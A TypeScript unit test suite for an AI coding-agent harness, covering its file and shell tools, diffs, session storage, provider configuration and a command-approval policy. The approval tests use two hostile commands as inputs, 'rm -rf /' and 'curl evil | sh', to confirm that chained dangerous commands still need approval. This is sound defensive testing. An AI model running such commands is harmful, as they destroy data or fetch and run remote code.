// 单元测试：不联网，覆盖工具、diff、审批策略、会话存储、配置、多协议消息转换
import fs from "node:fs";
import os from "node:os";
import path from "node:path";
import { checkApproval, commandKeys, isReadOnlyCommand } from "../src/core/approval.js";
import { SessionStore } from "../src/core/session.js";
import { loadConfig, saveConfig, resolveApiKey, apiKeySource, saveProvider, removeProvider, validateProvider, listModels, findModel, defaultModel, toModelInfo, fetchProviderModels, getProvider } from "../src/core/config.js";
import { getSecret, setSecret, deleteSecret } from "../src/core/secrets.js";
import http from "node:http";
import { lineDiff, diffStats, truncateHead, truncateTail } from "../src/core/tools/common.js";
import { bashTool } from "../src/core/tools/bash.js";
import { editTool, writeTool } from "../src/core/tools/write.js";
import { readTool } from "../src/core/tools/read.js";
import { buildSystemPrompt, projectDocs } from "../src/core/prompt.js";
import { describe, eq, expect, test } from "./harness.js";

const tmp = fs.mkdtempSync(path.join(os.tmpdir(), "stepharness-unit-"));
const ws = fs.realpathSync(tmp);
const ctx = (over: object = {}) => ({ cwd: ws, signal: new AbortController().signal, env: process.env, onUpdate: () => {}, ...over });
const textOf = (o: any) => o.content.map((b: any) => b.text ?? "").join("");

describe("read 工具", () => {
  test("分页读取并提示如何续读", async () => {
    fs.writeFileSync(path.join(ws, "a.ts"), Array.from({ length: 100 }, (_, i) => `line${i + 1}`).join("\n"));
    const r = await readTool.execute({ path: "a.ts", offset: 10, limit: 5 }, ctx());
    const t = textOf(r);
    expect(t.startsWith("line10"));
    expect(t.includes("offset=15"));
  });
  test("读取目录时列出内容", async () => {
    fs.mkdirSync(path.join(ws, "dir"), { recursive: true });
    fs.writeFileSync(path.join(ws, "dir/x.txt"), "x");
    expect(textOf(await readTool.execute({ path: "dir" }, ctx())).includes("x.txt"));
  });
  test("图片返回 image 内容块", async () => {
    const png = Buffer.from("89504e470d0a1a0a0000000d49484452000000010000000108060000001f15c4890000000a49444154789c6360000002000154a24f5e0000000049454e44ae426082", "hex");
    fs.writeFileSync(path.join(ws, "i.png"), png);
    const r = await readTool.execute({ path: "i.png" }, ctx());
    eq(r.content.filter((b: any) => b.type === "image").length, 1);
  });
  test("二进制文件报错", async () => {
    fs.writeFileSync(path.join(ws, "b.bin"), Buffer.from([0, 1, 2, 3, 0, 5]));
    let err = "";
    try { await readTool.execute({ path: "b.bin" }, ctx()); } catch (e) { err = (e as Error).message; }
    expect(/二进制/.test(err));
  });
  test("文件不存在时报错", async () => {
    let err = "";
    try { await readTool.execute({ path: "nope.txt" }, ctx()); } catch (e) { err = (e as Error).message; }
    expect(/不存在/.test(err));
  });
  test("offset 超出范围时报错", async () => {
    fs.writeFileSync(path.join(ws, "s.txt"), "a\nb");
    let err = "";
    try { await readTool.execute({ path: "s.txt", offset: 99 }, ctx()); } catch (e) { err = (e as Error).message; }
    expect(/超出/.test(err));
  });
});

describe("edit / write 工具", () => {
  test("新建文件并返回创建标记和 diff 统计", async () => {
    const r = await writeTool.execute({ path: "new.ts", content: "a\nb\nc\n" }, ctx());
    eq((r.details as any).created, true); eq((r.details as any).added, 3);
  });
  test("多处替换基于原文件匹配", async () => {
    fs.writeFileSync(path.join(ws, "m.ts"), "one\ntwo\nthree\n");
    const r = await editTool.execute({ path: "m.ts", edits: [{ oldText: "one", newText: "1" }, { oldText: "three", newText: "3" }] }, ctx());
    expect(fs.readFileSync(path.join(ws, "m.ts"), "utf8") === "1\ntwo\n3\n");
    eq([(r.details as any).added, (r.details as any).removed], [2, 2]);
  });
  test("oldText 找不到时报错并给出提示", async () => {
    fs.writeFileSync(path.join(ws, "x.ts"), "hello\n");
    let err = "";
    try { await editTool.execute({ path: "x.ts", edits: [{ oldText: "nope", newText: "x" }] }, ctx()); } catch (e) { err = (e as Error).message; }
    expect(/找不到/.test(err));
  });
  test("oldText 不唯一时报错", async () => {
    fs.writeFileSync(path.join(ws, "d.txt"), "aa\naa\n");
    let err = "";
    try { await editTool.execute({ path: "d.txt", edits: [{ oldText: "aa", newText: "b" }] }, ctx()); } catch (e) { err = (e as Error).message; }
    expect(/多次/.test(err));
  });
  test("重叠的修改被拒绝", async () => {
    fs.writeFileSync(path.join(ws, "o.txt"), "abcdef\n");
    let err = "";
    try { await editTool.execute({ path: "o.txt", edits: [{ oldText: "abc", newText: "1" }, { oldText: "bcd", newText: "2" }] }, ctx()); } catch (e) { err = (e as Error).message; }
    expect(/重叠/.test(err));
  });
  test("CRLF 文件保持原有换行符", async () => {
    fs.writeFileSync(path.join(ws, "crlf.txt"), "a\r\nb\r\n");
    await editTool.execute({ path: "crlf.txt", edits: [{ oldText: "b", newText: "B" }] }, ctx());
    eq(fs.readFileSync(path.join(ws, "crlf.txt"), "utf8"), "a\r\nB\r\n");
  });
  test("支持模型直接传 oldText/newText 的写法", async () => {
    fs.writeFileSync(path.join(ws, "legacy.txt"), "old\n");
    await editTool.execute({ path: "legacy.txt", oldText: "old", newText: "new" }, ctx());
    eq(fs.readFileSync(path.join(ws, "legacy.txt"), "utf8"), "new\n");
  });
  test("写入时自动创建父目录", async () => {
    await writeTool.execute({ path: "deep/a/b/c.ts", content: "x" }, ctx());
    expect(fs.existsSync(path.join(ws, "deep/a/b/c.ts")));
  });
  test("中文等多字节内容按字节统计", async () => {
    const r = await writeTool.execute({ path: "cn.txt", content: "中文内容测试" }, ctx());
    expect(textOf(r).includes("18 字节"));
  });
});

describe("bash 工具", () => {
  test("合并标准输出和标准错误，返回退出码", async () => {
    const r = await bashTool.execute({ command: "echo out; echo err >&2; exit 3" }, ctx());
    const t = textOf(r);
    expect(t.includes("out") && t.includes("err") && (r.details as any).exitCode === 3 && r.isError);
  });
  test("长输出只保留结尾并给出完整输出路径", async () => {
    const r = await bashTool.execute({ command: "seq 1 20000" }, ctx());
    const t = textOf(r);
    expect(t.includes("完整输出") && t.trim().endsWith("20000"));
    expect(fs.existsSync((r.details as any).fullOutputPath));
  });
  test("超时后终止进程", async () => {
    const t0 = Date.now();
    const r = await bashTool.execute({ command: "sleep 30", timeout: 1 }, ctx());
    expect(textOf(r).includes("超时") && Date.now() - t0 < 8000);
  });
  test("中断时结束整个进程组（含子进程）", async () => {
    const ac = new AbortController();
    setTimeout(() => ac.abort(), 400);
    const r = await bashTool.execute({ command: "sleep 30 & wait" }, ctx({ signal: ac.signal }));
    expect(textOf(r).includes("中断"));
  });
  test("输出通过 onUpdate 实时回传", async () => {
    let live = "";
    await bashTool.execute({ command: "echo 第一行; sleep 0.2; echo 第二行" }, ctx({ onUpdate: (s: string) => (live += s) }));
    expect(live.includes("第一行") && live.includes("第二行"));
  });
  test("不存在的工作目录会报错而不是挂起", async () => {
    let failed = false;
    try { await bashTool.execute({ command: "pwd" }, ctx({ cwd: path.join(ws, "does-not-exist") })); } catch { failed = true; }
    expect(failed);
  });
  test("命令为空时报错", async () => {
    let err = "";
    try { await bashTool.execute({ command: "  " }, ctx()); } catch (e) { err = (e as Error).message; }
    expect(/command/.test(err));
  });
});

describe("diff 与截断", () => {
  test("行级 diff 统计正确", () => {
    const d = lineDiff("a\nb\nc\n", "a\nB\nc\n");
    eq(diffStats(d), { added: 1, removed: 1 });
  });
  test("大段未改动的部分被折叠", () => {
    const a = Array.from({ length: 200 }, (_, i) => `l${i}`).join("\n");
    const d = lineDiff(a, a.replace("l100", "changed"));
    expect(d.length < 30, `diff 过长：${d.length} 行`);
    const many = lineDiff(Array.from({ length: 200 }, (_, i) => `l${i}`).join("\n"), Array.from({ length: 200 }, (_, i) => (i === 5 || i === 150 ? "changed" : `l${i}`)).join("\n"));
    expect(many.some((x) => x.s === "⋯"), "大段未改动的内容没有被折叠");
  });
  test("旧内容为空时全部算新增", () => eq(diffStats(lineDiff("", "a\nb")), { added: 2, removed: 0 }));
  test("按行数截断", () => {
    const t = truncateHead(Array.from({ length: 10 }, (_, i) => `l${i}`).join("\n"), 3);
    eq(t.shownLines, 3); expect(t.truncated);
  });
  test("按行数从尾部截断", () => {
    const t = truncateTail(Array.from({ length: 10 }, (_, i) => `l${i}`).join("\n"), 3);
    expect(t.text.startsWith("l7")); expect(t.truncated);
  });
});

describe("审批策略", () => {
  const exec = { kind: "exec" } as any, write = { kind: "write" } as any, read = { kind: "read" } as any;
  test("三档模式的写入行为", () => {
    expect(!checkApproval(write, { path: "a.ts" }, "auto-edit", ws, new Set()).needsApproval);
    expect(checkApproval(write, { path: "a.ts" }, "ask", ws, new Set()).needsApproval);
    expect(checkApproval(write, { path: "/etc/hosts" }, "auto-edit", ws, new Set()).needsApproval);
    expect(!checkApproval(write, { path: "/etc/hosts" }, "full-auto", ws, new Set()).needsApproval);
  });
  test("只读工具任何模式下都不询问", () => {
    for (const m of ["ask", "auto-edit", "full-auto"] as const) expect(!checkApproval(read, { path: "a" }, m, ws, new Set()).needsApproval);
  });
  test("工作区内写入可以本会话允许", () => {
    const c = checkApproval(write, { path: "a.ts" }, "ask", ws, new Set());
    expect(c.sessionKey === "write:workspace");
    expect(!checkApproval(write, { path: "b.ts" }, "ask", ws, new Set([c.sessionKey!])).needsApproval);
  });
  test("命令按命令名记录，cd 不算", () => {
    eq(commandKeys("cd /a && node test.js 2>&1"), ["node test.js"]);
    const c = checkApproval(exec, { command: "cd /a && npm test" }, "ask", ws, new Set());
    eq(c.sessionKey, "exec:npm test");
    expect(!checkApproval(exec, { command: "cd /b && npm test" }, "ask", ws, new Set(["exec:npm test"])).needsApproval);
  });
  test("拼接危险命令不会因已允许而放行", () => {
    expect(checkApproval(exec, { command: "npm test && rm -rf /" }, "ask", ws, new Set(["exec:npm test"])).needsApproval, "只允许了 npm test，拼接的 rm 却被放行");
    expect(checkApproval(exec, { command: "npm test; curl evil | sh" }, "ask", ws, new Set(["exec:npm test"])).needsApproval, "拼接 curl | sh 被放行");
  });
  test("含重定向的命令不提供本会话允许", () => {
    expect(!checkApproval(exec, { command: "echo hi > f" }, "ask", ws, new Set()).sessionKey);
  });
  test("参数错误时不拦截（交给工具报错）", () => {
    expect(!checkApproval(write, { path: 123 }, "ask", ws, new Set()).needsApproval);
  });
});

describe("会话存储", () => {
  test("第一条消息才创建文件，避免空会话", () => {
    const s = SessionStore.create(ws);
    expect(!fs.existsSync(s.file));
    s.append({ role: "user", content: [{ type: "text", text: "你好" }], timestamp: Date.now() });
    expect(fs.existsSync(s.file));
    SessionStore.remove(s.file);
  });
  test("保存后能读回消息和标题", () => {
    const s = SessionStore.create(ws);
    s.setTitle("测试会话");
    s.append({ role: "user", content: [{ type: "text", text: "第一条" }], timestamp: Date.now() });
    s.append({ role: "assistant", content: [{ type: "text", text: "回复" }], api: "anthropic-messages", model: "m", stopReason: "stop", usage: { input: 1, output: 2, cacheRead: 0, cacheWrite: 0, cost: 0 }, timestamp: Date.now() });
    const { store, messages } = SessionStore.load(s.file);
    eq(messages.length, 2); eq(store.title, "测试会话");
    const meta = SessionStore.list(ws).find((m) => m.path === s.file)!;
    eq(meta.title, "测试会话");
    SessionStore.remove(s.file);
  });
  test("损坏的行被跳过而不是整体失败", () => {
    const s = SessionStore.create(ws);
    s.append({ role: "user", content: [{ type: "text", text: "ok" }], timestamp: Date.now() });
    fs.appendFileSync(s.file, "{坏掉的 json\n");
    eq(SessionStore.load(s.file).messages.length, 1);
    SessionStore.remove(s.file);
  });
  test("中文和 emoji 内容不丢失", () => {
    const s = SessionStore.create(ws);
    const text = "你好 👋 这是一段中文，包含引号和换行\n第二行";
    s.append({ role: "user", content: [{ type: "text", text }], timestamp: Date.now() });
    eq((SessionStore.load(s.file).messages[0].content as any)[0].text, text);
    SessionStore.remove(s.file);
  });
});

describe("配置与模型服务", () => {
  test("偏好设置保存后能读回", () => {
    saveConfig({ thinking: "medium", approvalMode: "ask" });
    eq(loadConfig().thinking, "medium"); eq(loadConfig().approvalMode, "ask");
    saveConfig({ thinking: "low", approvalMode: "auto-edit" });
  });
  test("添加服务：校验 ID、地址、去掉末尾斜杠和误填的接口路径", () => {
    const p = validateProvider({ id: "DeepSeek", name: "", api: "openai-completions", baseUrl: "https://api.deepseek.com/chat/completions/", models: [{ id: "deepseek-chat" }, { id: "deepseek-chat" }, { id: " " }] });
    eq(p.id, "deepseek"); eq(p.baseUrl, "https://api.deepseek.com"); eq(p.models.map((m) => m.id), ["deepseek-chat"]);
    eq(validateProvider({ id: "a", name: "a", api: "anthropic-messages", baseUrl: "https://x.com/v1/messages", models: [] }).baseUrl, "https://x.com");
  });
  test("非法配置给出可读的错误", () => {
    const bad = (p: any, re: RegExp) => { let err = ""; try { validateProvider(p); } catch (e) { err = (e as Error).message; } expect(re.test(err), `错误信息：${err}`); };
    bad({ id: "有中文", api: "openai-completions", baseUrl: "https://x", models: [] }, /ID/);
    bad({ id: "a", api: "grpc", baseUrl: "https://x", models: [] }, /API 类型/);
    bad({ id: "a", api: "openai-completions", baseUrl: "ftp://x", models: [] }, /http/);
    bad({ id: "a", api: "openai-completions", baseUrl: "http://api.example.com/v1", models: [] }, /https/);
    bad({ id: "a", api: "openai-completions", baseUrl: "https://x", apiKeyEnv: "1BAD", models: [] }, /环境变量/);
  });
  test("本机 http 地址允许（方便接本地模型）", () => {
    eq(validateProvider({ id: "local", name: "l", api: "openai-completions", baseUrl: "http://localhost:11434/v1", models: [] }).baseUrl, "http://localhost:11434/v1");
  });
  test("新增时 ID 重复会被拒绝，编辑时允许覆盖", () => {
    saveProvider({ id: "dup", name: "A", api: "openai-completions", baseUrl: "https://a.com/v1", models: [] }, { isNew: true });
    let threw = false; try { saveProvider({ id: "dup", name: "B", api: "openai-completions", baseUrl: "https://b.com/v1", models: [] }, { isNew: true }); } catch { threw = true; }
    expect(threw);
    saveProvider({ id: "dup", name: "B", api: "openai-completions", baseUrl: "https://b.com/v1", models: [] });
    eq(getProvider("dup")!.name, "B");
    removeProvider("dup");
  });
  test("模型标识是「服务/模型」，模型 ID 本身可以带斜杠", () => {
    saveProvider({ id: "or", name: "OpenRouter", api: "openai-completions", baseUrl: "https://openrouter.ai/api/v1", models: [{ id: "anthropic/claude-sonnet-4" }] });
    const m = findModel("or/anthropic/claude-sonnet-4");
    eq(m?.id, "anthropic/claude-sonnet-4"); eq(m?.provider, "or");
    eq(findModel("or/不存在"), undefined); eq(findModel("没有斜杠"), undefined);
    removeProvider("or");
  });
  test("按模型名推断能力；可以单独覆盖", () => {
    const p = validateProvider({ id: "x", name: "x", api: "anthropic-messages", baseUrl: "https://api.anthropic.com", models: [] });
    const claude = toModelInfo(p, { id: "claude-sonnet-5" });
    expect(claude.input.includes("image") && claude.reasoning && (claude.compat as any)?.forceAdaptiveThinking);
    const custom = toModelInfo(p, { id: "my-model", contextWindow: 32000, input: ["text"] });
    eq([custom.contextWindow, custom.input], [32000, ["text"]]);
    const oai = toModelInfo({ ...p, api: "openai-completions", baseUrl: "https://api.openai.com/v1" }, { id: "gpt-4.1" });
    eq((oai.compat as any).maxTokensField, "max_completion_tokens");
    const other = toModelInfo({ ...p, api: "openai-completions", baseUrl: "https://api.deepseek.com" }, { id: "deepseek-chat" });
    eq((other.compat as any).maxTokensField, "max_tokens");
  });
  test("默认模型：配置的优先，失效时回退到第一个", () => {
    saveProvider({ id: "p1", name: "P1", api: "openai-completions", baseUrl: "https://a.com/v1", models: [{ id: "m1" }, { id: "m2" }] });
    saveConfig({ defaultModel: "p1/m2" }); eq(defaultModel()?.id, "m2");
    saveConfig({ defaultModel: "p1/已删除" }); eq(defaultModel()?.id, "m1");
    eq(listModels().length, 2);
    removeProvider("p1");
    eq(defaultModel(), undefined);
  });
  test("删除服务时一并删除它的 Key 和默认模型", () => {
    saveProvider({ id: "gone", name: "G", api: "openai-completions", baseUrl: "https://a.com/v1", models: [{ id: "m" }] });
    setSecret("gone", "sk-gone"); saveConfig({ defaultModel: "gone/m" });
    removeProvider("gone");
    eq(getSecret("gone"), undefined); eq(loadConfig().defaultModel, undefined);
  });
});

describe("API Key", () => {
  test("Key 来自设置里保存的值", () => {
    saveProvider({ id: "k1", name: "K", api: "openai-completions", baseUrl: "https://a.com/v1", models: [] });
    eq(resolveApiKey("k1"), ""); eq(apiKeySource("k1").ok, false);
    setSecret("k1", "sk-saved");
    eq(resolveApiKey("k1"), "sk-saved"); expect(apiKeySource("k1").ok);
    removeProvider("k1");
  });
  test("只有明确指定了环境变量才会读取，且优先于保存的值", () => {
    process.env.SH_TEST_KEY = "sk-from-env";
    saveProvider({ id: "k2", name: "K", api: "openai-completions", baseUrl: "https://a.com/v1", models: [] });
    setSecret("k2", "sk-saved");
    eq(resolveApiKey("k2"), "sk-saved", "没有指定环境变量时不应读取");
    saveProvider({ id: "k2", name: "K", api: "openai-completions", baseUrl: "https://a.com/v1", apiKeyEnv: "SH_TEST_KEY", models: [] });
    eq(resolveApiKey("k2"), "sk-from-env");
    expect(/SH_TEST_KEY/.test(apiKeySource("k2").source));
    delete process.env.SH_TEST_KEY; removeProvider("k2");
  });
  test("不存在的服务返回空", () => eq(resolveApiKey("没有这个服务"), ""));
  test("Key 不能为空或包含换行", () => {
    for (const bad of ["", "  ", "sk-a\nsk-b"]) { let threw = false; try { setSecret("x", bad); } catch { threw = true; } expect(threw, JSON.stringify(bad)); }
  });
  if (process.platform === "darwin") {
    test("macOS 钥匙串：读写删除，特殊字符和中文不变形", () => {
      const prev = { svc: process.env.STEPHARNESS_KEYCHAIN_SERVICE, mode: process.env.STEPHARNESS_SECRETS };
      process.env.STEPHARNESS_KEYCHAIN_SERVICE = `StepHarness-test-${process.pid}`; delete process.env.STEPHARNESS_SECRETS;
      try {
        for (const key of ['sk-plain', 'abcdef0123456789', 'sk "quote" $x \\back 中文 🔑']) {
          setSecret("kc", key);
          eq(getSecret("kc"), key);
        }
        deleteSecret("kc");
        eq(getSecret("kc"), undefined);
      } finally {
        deleteSecret("kc");
        if (prev.svc === undefined) delete process.env.STEPHARNESS_KEYCHAIN_SERVICE; else process.env.STEPHARNESS_KEYCHAIN_SERVICE = prev.svc;
        if (prev.mode !== undefined) process.env.STEPHARNESS_SECRETS = prev.mode;
      }
    });
  }
});

describe("从服务获取模型列表", () => {
  let server: http.Server, base = "";
  const seen: { url?: string; headers: http.IncomingHttpHeaders }[] = [];
  test("启动模拟服务", async () => {
    server = http.createServer((req, res) => {
      seen.push({ url: req.url, headers: req.headers });
      const auth = req.headers["x-api-key"] || String(req.headers.authorization || "").replace(/^Bearer /, "");
      if (auth !== "good-key") { res.writeHead(401, { "content-type": "application/json" }); return res.end(JSON.stringify({ error: { message: "Invalid API Key" } })); }
      res.writeHead(200, { "content-type": "application/json" });
      res.end(JSON.stringify({ data: [{ id: "chat-b" }, { id: "chat-a" }, { id: "text-embedding-3" }, { id: "whisper-1" }] }));
    });
    await new Promise<void>((r) => server.listen(0, "127.0.0.1", () => r()));
    base = `http://127.0.0.1:${(server.address() as any).port}`;
  });
  test("OpenAI 兼容：GET /models，用 Bearer，过滤掉非对话模型并排序", async () => {
    const ids = await fetchProviderModels({ id: "o", name: "o", api: "openai-completions", baseUrl: `${base}/v1`, models: [] }, "good-key");
    eq(ids, ["chat-a", "chat-b"]);
    eq(seen[seen.length - 1].url, "/v1/models");
  });
  test("Anthropic：GET /v1/models，用 x-api-key 和版本头", async () => {
    await fetchProviderModels({ id: "a", name: "a", api: "anthropic-messages", baseUrl: base, models: [] }, "good-key");
    const last = seen[seen.length - 1];
    expect(last.url!.startsWith("/v1/models") && last.headers["anthropic-version"] === "2023-06-01" && !last.headers.authorization);
  });
  test("额外请求头会带上", async () => {
    await fetchProviderModels({ id: "o", name: "o", api: "openai-completions", baseUrl: `${base}/v1`, headers: { "X-Team": "dev" }, models: [] }, "good-key");
    eq(seen[seen.length - 1].headers["x-team"], "dev");
  });
  test("Key 错误时给出服务返回的错误信息", async () => {
    let err = ""; try { await fetchProviderModels({ id: "o", name: "o", api: "openai-completions", baseUrl: `${base}/v1`, models: [] }, "bad"); } catch (e) { err = (e as Error).message; }
    expect(/401/.test(err) && /Invalid API Key/.test(err), err);
  });
  test("没有 Key 时不发请求", async () => {
    const n = seen.length; let threw = false;
    try { await fetchProviderModels({ id: "o", name: "o", api: "openai-completions", baseUrl: `${base}/v1`, models: [] }, ""); } catch { threw = true; }
    expect(threw && seen.length === n);
  });
  test("关闭模拟服务", () => { server.close(); });
});

describe("系统提示词", () => {
  test("包含工作区、工具列表和语言要求", () => {
    const p = buildSystemPrompt({ cwd: ws, model: { id: "m", name: "测试模型" } as any, tools: [{ name: "read", description: "读文件。其他" } as any] });
    expect(p.includes(ws) && p.includes("read") && p.includes("语言") && p.includes("测试模型"));
  });
  test("AGENTS.md 会被加载进提示词", () => {
    fs.writeFileSync(path.join(ws, "AGENTS.md"), "本项目使用 pnpm");
    const p = buildSystemPrompt({ cwd: ws, model: { id: "m", name: "m" } as any, tools: [] });
    expect(p.includes("本项目使用 pnpm"));
    fs.rmSync(path.join(ws, "AGENTS.md"));
  });
  test("没有说明文件时不报错", () => {
    eq(projectDocs(ws).length, 0);
  });
});

export const cleanup = () => fs.rmSync(tmp, { recursive: true, force: true });
export { ws as testWorkspace };
